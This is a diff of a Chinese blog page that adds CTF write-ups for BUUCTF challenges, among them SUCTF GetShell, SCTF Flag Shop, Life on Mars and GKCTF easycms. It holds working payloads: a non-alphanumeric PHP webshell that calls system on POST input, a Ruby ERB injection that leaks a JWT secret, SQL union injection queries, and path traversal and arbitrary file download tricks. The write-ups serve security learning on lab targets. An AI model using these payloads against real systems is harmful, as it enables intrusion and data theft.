@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-28
+                    2022-04-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.9k
+                    14.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    26 分
+                    70 分
                 </div>
                 
 
@@ -1142,6 +1142,923 @@ echo serialize($a);
 <pre class="language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code></pre>
 
 <p>然后用户名为admin，密码为1登录即可</p>
+<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143553884.png" alt="image-20220406143553884"></p>
+<p>很明显是传个一句话上去，但是他会对文件内容从第六位开始进行黑名单检测，用bp简单fuzz一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143904075.png" alt="image-20220406143904075"></p>
+<p>括号还有取反符号都没被过滤，参考一下p牛的文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
+<p><strong>方法一</strong></p>
+<p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<p><strong>方法二</strong></p>
+<p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。</p>
+<p>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p>
+<p><strong>方法三</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406144305986.png" alt="image-20220406144305986"></p>
+<pre class="language-none"><code class="language-none">&lt;?php
+$_&#x3D;[];
+$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;
+$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];
+$___&#x3D;$_; &#x2F;&#x2F; A
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.&#x3D;$__; &#x2F;&#x2F; S
+$___.&#x3D;$__; &#x2F;&#x2F; S
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++; &#x2F;&#x2F; E 
+$___.&#x3D;$__;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R
+$___.&#x3D;$__;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T
+$___.&#x3D;$__;
+
+$____&#x3D;&#39;_&#39;;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P
+$____.&#x3D;$__;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O
+$____.&#x3D;$__;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S
+$____.&#x3D;$__;
+$__&#x3D;$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T
+$____.&#x3D;$__;
+
+$_&#x3D;$$____;
+$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</code></pre>
+
+<p>这题里取反符号没被过滤，那我们就用第二种方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406151728717.png" alt="image-20220406151728717"></p>
+<p>可以看到我们可以利用数组的方式从汉字的取反值里读出一个字母</p>
+<p>找篇p牛的文章跑一下</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+$dome &#x3D; &#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。
+
+前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。
+
+旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。
+
+当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。
+
+我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。
+
+生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不惊。
+
+远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。
+
+去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。
+
+我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。
+
+这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。
+
+颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。
+
+昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。
+
+说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。
+
+有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。
+
+人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。
+
+那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。
+
+后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。
+
+来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。
+
+站在屋顶的我，喝下杯中最后一口水。
+
+清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。
+
+不知不觉我又想到辜鸿铭与沈子培的那段对话。
+
+“大难临头，何以为之？”
+
+“世受国恩，死生系之。”&#39;;
+
+for($i &#x3D;0 ; $i &lt; 1000 ; $i++)
+&#123;
+    $sub_str &#x3D; mb_substr($dome, $i, 1);
+    echo $sub_str.&#39;&#x3D;&#39;.~($sub_str)[1];
+    echo &quot;\r\n&quot;;
+&#125;</code></pre>
+
+<p>我们想构造system（这里不构造eval的原因是<strong>eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然她确实像极了函数原型）。</strong>这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，..</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406154353685.png" alt="image-20220406154353685"></p>
+<p>然后把我们想要的字母找出来</p>
+<pre class="language-none"><code class="language-none">北&#x3D;s
+冲&#x3D;y
+北&#x3D;s
+择&#x3D;t
+的&#x3D;e
+和&#x3D;m
+说&#x3D;P
+小&#x3D;O
+笔&#x3D;S
+站&#x3D;T</code></pre>
+
+<p>好了，但是1是数字，显然不能直接用，所以还要尝试利用php的特性获得1</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406160337447.png" alt="image-20220406160337447"></p>
+<p>最终payload</p>
+<pre class="language-none"><code class="language-none">&lt;?&#x3D;$__&#x3D;[];$___&#x3D;[];$_&#x3D;$__&#x3D;&#x3D;$___;$____&#x3D;~(北)[$_].~(冲)[$_].~(北)[$_].~(择)[$_].~(的)[$_].~(和)[$_];$_____&#x3D;_.~(说)[$_].~(小)[$_].~(笔)[$_].~(站)[$_];$____($$_____[$____]);</code></pre>
+
+<p>php传上去直接给注释了，所以可以用短标签</p>
+<p>flag在环境变量里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406164336286.png" alt="image-20220406164336286"></p>
+<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>点进去之前我还以为是个条件竞争。。。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141457347.png" alt="image-20220407141457347"></p>
+<p>钱显然不够买flag的，点work可以增加，但是这道题显然不是为了测脚本编写水平的</p>
+<p>网站存在jwt</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141641849.png" alt="image-20220407141641849"></p>
+<p>解码看一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407141659470.png" alt="image-20220407141659470"></p>
+<p>但是这里有着我们不知道的密钥，那么下面就是想办法获取密钥把jwt里的jkl值改大，购买flag就行了</p>
+<p>网站存在robots.txt，访问一下看到filebak路径</p>
+<pre class="language-none"><code class="language-none">require &#39;sinatra&#39;
+require &#39;sinatra&#x2F;cookies&#39;
+require &#39;sinatra&#x2F;json&#39;
+require &#39;jwt&#39;
+require &#39;securerandom&#39;
+require &#39;erb&#39;
+
+set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39;
+
+FLAGPRICE &#x3D; 1000000000000000000000000000
+ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64)
+
+configure do
+  enable :logging
+  file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;)
+  file.sync &#x3D; true
+  use Rack::CommonLogger, file
+end
+
+get &quot;&#x2F;&quot; do
+  redirect &#39;&#x2F;shop&#39;, 302
+end
+
+get &quot;&#x2F;filebak&quot; do
+  content_type :text
+  erb IO.binread __FILE__
+end
+
+get &quot;&#x2F;api&#x2F;auth&quot; do
+  payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125;
+  auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+  cookies[:auth] &#x3D; auth
+end
+
+get &quot;&#x2F;api&#x2F;info&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)
+end
+
+get &quot;&#x2F;shop&quot; do
+  erb :shop
+end
+
+get &quot;&#x2F;work&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+  auth &#x3D; auth[0]
+  unless params[:SECRET].nil?
+    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)
+      puts ENV[&quot;FLAG&quot;]
+    end
+  end
+
+  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then
+
+    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)
+    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+    cookies[:auth] &#x3D; auth
+    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result
+
+  end
+end
+
+post &quot;&#x2F;shop&quot; do
+  islogin
+  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;
+
+  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then
+
+    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)
+  else
+
+    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;
+    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;
+    cookies[:auth] &#x3D; auth
+    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)
+  end
+end
+
+
+def islogin
+  if cookies[:auth].nil? then
+    redirect to(&#39;&#x2F;shop&#39;)
+  end
+end</code></pre>
+
+<p>这里是个ruby的模板注入漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p>主要是看work路由这块</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407142001278.png" alt="image-20220407142001278"></p>
+<p>ruby没学过，也没安环境，有的地方就直接截别的师傅的博客了</p>
+<p>先看下边这段</p>
+<p>这段大概意思就是要我们输入的do的参数和<code>#&#123;params[:name][0,7]&#125; is working</code>这块进行一个比较，如果相等就会执行<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code>这段，而<code>#&#123;params[:name][0,7]&#125;</code>这里我们是可以控制的，也就是所谓的ruby的<code>Erb</code>模板注入，注入语句的格式是&lt;%=%&gt;至少是五个字符，但是之前的参数的比较只比较name参数的前七位，所以我们实际能控制的也就只有两个字符</p>
+<p>我们可以先试试让它输出1，特殊字符记得要先url编个码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407144338866.png" alt="image-20220407144338866"></p>
+<p>再看上边这段，他会将我们以secret为键的参数与环境变量里的secret进行比较，然后输出境变量里的secret</p>
+<p>这里需要用到<code>Ruby</code>语言的一个特性。ruby的全局变量</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zdq0394123/article/details/8443694">(3条消息) Ruby全局变量汇总_zdq0394的博客-CSDN博客</a></p>
+<p>我们可以利用其中的<code>$&#39;</code>来返回正则匹配结果的右边</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145649686.png" alt="image-20220407145649686"></p>
+<p>所以我们如果把传入的secret值为空，那么默认环境变量里的secret全在匹配结果的右边，也就能读出我们的密钥</p>
+<pre class="language-none"><code class="language-none">&#x2F;work?name&#x3D;&lt;%25&#x3D;$%27%25&gt;&amp;do&#x3D;&lt;%25&#x3D;$%27%25&gt;%20is%20working&amp;SECRET&#x3D;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407145856242.png" alt="image-20220407145856242"></p>
+<p>拿到密钥直接改jwt就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150544659.png" alt="image-20220407150544659"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150645048.png" alt="image-20220407150645048"></p>
+<p>买了flag之后再对jwt解个码就能拿到flag了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150731822.png" alt="image-20220407150731822"></p>
+<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看</p>
+<p>看到有个search参数，这里存在sql注入</p>
+<p>先用order by探一下列数，然后直接联合注入</p>
+<p>注表名：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p>
+<p>但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名</p>
+<p>这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来</p>
+<p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库,不知道为什么</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p>
+<p>看一下alien_code库</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104425032.png" alt="image-20220408104425032"></p>
+<p>再看看code表</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104548291.png" alt="image-20220408104548291"></p>
+<p>爆字段</p>
+<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104808831.png" alt="image-20220408104808831"></p>
+<h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示是后台五位弱密码</p>
+<p>所以猜admin/admin或者是admin/12345</p>
+<p>进入后直接访问admin.php然后admin/12345登录</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175631685.png" alt="image-20220409175631685"></p>
+<p>这题解法有两种</p>
+<p><strong>第一种</strong></p>
+<p>设计-主题里可以进行自定义设置，而类型可以选php源代码，也就可以直接写入命令来执行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409175811880.png" alt="image-20220409175811880"></p>
+<p>但是当你写入时会显示</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180227413.png" alt="image-20220409180227413"></p>
+<p>这是因为在安全这里设置了文件验证</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409180314453.png" alt="image-20220409180314453"></p>
+<p>但是要取消文件验证也要有这个文件</p>
+<p>这时候就要利用这个文件上传功能</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409181921966.png" alt="image-20220409181921966"></p>
+<p>传个文件可以看到存储路径</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182027467.png" alt="image-20220409182027467"></p>
+<p>那如果我们重命名这个文件能不能实现目录穿越，让它上传到我们想要的目录下呢</p>
+<p>结果是可以的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182445406.png" alt="image-20220409182445406"></p>
+<p>然后我们就可以去掉文件验证，然后利用cat /flag查看flag了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182652538.png" alt="image-20220409182652538"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409182641926.png" alt="image-20220409182641926"></p>
+<p><strong>方法二</strong></p>
+<p>在导出主题的时候，我们可以看一下下载链接</p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;511d2b5b-5b1e-4369-bccf-8bce11b0cea1.node4.buuoj.cn:81&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA&#x3D;&#x3D;</code></pre>
+
+<p>对后边这段base64解码可以看出</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183057640.png" alt="image-20220409183057640"></p>
+<p>这里是文件的路径，那我们可以把这个修改成/flag来直接下载flag（猜flag的文件名感觉太看运气了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183154025.png" alt="image-20220409183154025"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220409183220108.png" alt="image-20220409183220108"></p>
+<p>这道题感觉难度不高，但更像真实环境，所以更需要思路和经验</p>
+<h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>打着文件上传名字的反序列化题</p>
+<p>进入后先注册，登录能看到一个文件上传的页面，传个图片上去，发现能看见路径，那很显然要传个马上去连一下。</p>
